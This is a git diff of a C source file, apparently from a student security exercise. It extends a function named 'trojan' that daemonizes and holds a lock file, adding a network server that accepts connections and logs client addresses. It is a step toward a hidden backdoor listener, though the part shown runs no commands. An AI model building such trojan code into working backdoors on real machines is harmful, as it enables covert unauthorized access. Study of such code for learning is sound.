@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/02 10:03:56 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/02 12:39:38 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,6 +27,7 @@ void		lock_file(t_env *e) {
 
 void		trojan(t_env *e)
 {;
+	signal_handler();
 	pid_t process_id = 0;
 	pid_t sid = 0;
 	process_id = fork();
@@ -53,12 +54,16 @@ void		trojan(t_env *e)
 
 	if ((e->f_logs = fopen(LOG_PATH, "w+")) == NULL)
 		exit(1);
-
 	lock_file(e);
+	create_server(e);
 	while (1)
 	{
-		sleep(1);
-		fprintf(e->f_logs, "Logging info...\n");
+		fprintf(e->f_logs, "Waiting for a new connection.\n");
+		fflush(e->f_logs);
+		if ((e->csock = accept(e->hsock, (struct sockaddr *)&e->haddr, &e->haddr_size)) == -1)
+			exit(1);
+		get_client_ip(e);
+		fprintf(e->f_logs, "Received new connection: %s:%d\n", e->client_ip, e->client_port);
 		fflush(e->f_logs);
 	}
 	fclose(e->f_logs);
